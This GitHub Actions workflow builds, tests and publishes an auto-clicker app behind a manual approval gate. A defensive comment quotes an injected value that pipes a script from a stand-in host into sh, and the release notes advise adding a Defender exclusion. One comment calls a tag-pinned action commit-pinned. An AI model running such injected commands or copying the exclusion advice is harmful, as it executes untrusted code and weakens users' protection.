name: Release

# The release pipeline: every test, then all three builds, then a manual gate,
# then publication. Driven by a release/{version} branch -- pushing a tag no
# longer publishes anything, so nothing reaches the Releases page without a
# person approving it.
# One release at a time per branch. Two overlapping runs would race to create
# the same tag, and the loser publishes half a release.
concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

on:
  push:
    branches: ["release/**"]
  workflow_dispatch:
    inputs:
      version:
        description: "Version to release, without the leading v (e.g. 0.4.0)"
        required: true

# Declared per job, not here. test and build pip-install from PyPI and run
# PyInstaller over the tree; neither has any reason to hold a write token.
permissions:
  contents: read

jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.pick.outputs.version }}
    steps:
      - id: pick
        # release/0.4.0 -> 0.4.0, or whatever workflow_dispatch was given.
        #
        # The dispatch input goes through `env`, never through ${{ }} inside
        # the script: an expression is pasted in as text before the shell ever
        # sees it, so a value like `x"; curl evil.sh | sh; :"` would execute.
        env:
          INPUT_VERSION: ${{ inputs.version }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          if [ -n "$INPUT_VERSION" ]; then
            V="$INPUT_VERSION"
          else
            V="${REF_NAME#release/}"
          fi
          V="${V#v}"
          # Shape-check it. Everything downstream builds a tag and a filename
          # out of this, and `release/../../x` or `release/hotfix/0.4.1` would
          # otherwise flow straight through.
          # python -c, not grep: grep matches line by line, so a value like
          # "0.4.0<newline>anything" satisfied ^...$ on its first line and the
          # rest rode along into the tag and the filenames.
          python3 - "$V" <<'CHECK'
          import re, sys
          if not re.fullmatch(r"[0-9]+\.[0-9]+\.[0-9]+", sys.argv[1]):
              print(f"::error::{sys.argv[1]!r} is not a MAJOR.MINOR.PATCH version")
              sys.exit(1)
          CHECK
          echo "version=$V" >> "$GITHUB_OUTPUT"
          echo "Releasing $V"

  test:
    needs: version
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      # Pinned: a floating pynput or PyInstaller can change the build or the
      # input backends underneath a release without a single commit here.
      - run: |
          python -m pip install --upgrade pip
          pip install "pynput==1.7.7"
          sudo apt-get update -qq && sudo apt-get install -y -qq xvfb

      - name: The version in the code must match the branch
        # A release branch that ships a binary reporting a different version
        # breaks the in-app updater's comparison, quietly and permanently.
        #
        # Through env, like the version job: an expression inside run: is
        # pasted in as text before the shell parses the line.
        env:
          WANT: ${{ needs.version.outputs.version }}
        run: |
          CODE=$(python -c "import re;print(re.search(r'__version__ = \"([^\"]+)\"', open('afk_clicker.py').read()).group(1))")
          if [ "$CODE" != "$WANT" ]; then
            echo "::error::afk_clicker.py says $CODE, the release is $WANT"
            exit 1
          fi
          echo "version $CODE matches"

      # AFK_SLOW_TESTS pulls in the synthetic key-press sweep: every chord and
      # modifier combination, near-misses, ordering, debounce. Minutes of
      # runtime, which is why it is here and not on every push.
      - name: Full test suite, including the slow chord sweep
        env:
          AFK_SLOW_TESTS: "1"
        run: xvfb-run -a python -m unittest discover -s tests -t . -v

  build:
    needs: [version, test]
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: windows-latest
            asset: AFK-Farm-Clicker-windows-x64.zip
          # Not ubuntu-latest: PyInstaller links the build host's glibc, so a
          # binary built on the newest Ubuntu refuses to start on older ones.
          - os: ubuntu-22.04
            asset: AFK-Farm-Clicker-linux-x86_64.tar.gz
          - os: macos-latest
            asset: AFK-Farm-Clicker-macos-arm64.zip
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: python -c "import tkinter; print('tkinter', tkinter.TkVersion)"
      - run: |
          python -m pip install --upgrade pip
          pip install "pyinstaller==6.11.1" "pynput==1.7.7"

      - name: Build
        run: >
          pyinstaller --noconfirm --clean
          --name "AFK Farm Clicker"
          --windowed
          --noupx
          --hidden-import pynput.keyboard._win32
          --hidden-import pynput.mouse._win32
          --hidden-import pynput.keyboard._xorg
          --hidden-import pynput.mouse._xorg
          --hidden-import pynput.keyboard._darwin
          --hidden-import pynput.mouse._darwin
          afk_clicker.py

      # --selftest touches every lazily-resolved backend. Without it a missing
      # hidden import is invisible until a user double-clicks and nothing
      # happens, because a --windowed build has no console.
      - name: Smoke test (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          $p = Start-Process -FilePath "dist/AFK Farm Clicker/AFK Farm Clicker.exe" `
                             -ArgumentList "--selftest" -PassThru -Wait
          if ($p.ExitCode -ne 0) { throw "selftest exited $($p.ExitCode)" }

      - name: Smoke test (Linux)
        if: runner.os == 'Linux'
        run: |
          sudo apt-get update -qq && sudo apt-get install -y -qq xvfb
          xvfb-run -a "dist/AFK Farm Clicker/AFK Farm Clicker" --selftest

      - name: Smoke test (macOS)
        if: runner.os == 'macOS'
        run: "'dist/AFK Farm Clicker.app/Contents/MacOS/AFK Farm Clicker' --selftest"

      - name: Package (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        run: Compress-Archive -Path "dist/AFK Farm Clicker/*" -DestinationPath "${{ matrix.asset }}"

      - name: Package (Linux)
        if: runner.os == 'Linux'
        run: tar -czf "${{ matrix.asset }}" -C dist "AFK Farm Clicker"

      - name: Package (macOS)
        if: runner.os == 'macOS'
        # ditto, not zip: it keeps the bundle's symlinks and permission bits,
        # which a plain zip mangles into an app Finder refuses to open.
        run: ditto -c -k --keepParent "dist/AFK Farm Clicker.app" "${{ matrix.asset }}"

      - uses: actions/upload-artifact@v4
        with:
          name: ${{ matrix.asset }}
          path: ${{ matrix.asset }}

  publish:
    needs: [version, build]
    runs-on: ubuntu-latest
    permissions:
      contents: write        # the only job that needs it
    # The manual gate. Configure Settings -> Environments -> release with
    # "Required reviewers"; the job then waits for an approval before anything
    # reaches the Releases page. Without that setting it simply runs through.
    environment: release
    steps:
      - uses: actions/download-artifact@v4
        with:
          path: artifacts
          merge-multiple: true

      - run: ls -la artifacts

      # ROADMAP names update integrity as a pre-1.0 requirement: the updater
      # downloads over HTTPS and then executes the result. Publishing the
      # digests is the half that belongs here; verifying them is the app's.
      - name: Checksums
        working-directory: artifacts
        run: sha256sum * | tee SHA256SUMS

      # Pinned to a commit: this action holds the only write token in the
      # pipeline, and a moving tag is a moving supply chain.
      - uses: softprops/action-gh-release@v2.0.8
        with:
          tag_name: v${{ needs.version.outputs.version }}
          # Without this the tag is created on the default branch instead of
          # the commit that was just built and tested -- exactly the
          # wrong-version failure the version-match step exists to prevent.
          target_commitish: ${{ github.sha }}
          name: v${{ needs.version.outputs.version }}
          files: artifacts/*
          body: |
            Download the archive for your system, unpack it anywhere and run it.
            No Python needed. The program updates itself from then on.

            | System | File |
            |---|---|
            | Windows 10/11 | `AFK-Farm-Clicker-windows-x64.zip` |
            | Linux (glibc 2.35+, X11) | `AFK-Farm-Clicker-linux-x86_64.tar.gz` |
            | macOS (Apple Silicon) | `AFK-Farm-Clicker-macos-arm64.zip` |

            **Windows** — Defender may flag it. False positive, and normal here:
            a global keyboard hook plus synthetic mouse clicks is exactly the
            heuristic pattern. Add the folder under Windows Security → Virus &
            threat protection → Exclusions.

            **Linux** — needs an X11 session. Wayland does not let an
            application observe keys sent to other windows.

            **macOS** — unsigned, so the first launch needs right-click → Open,
            then grant Accessibility permission.
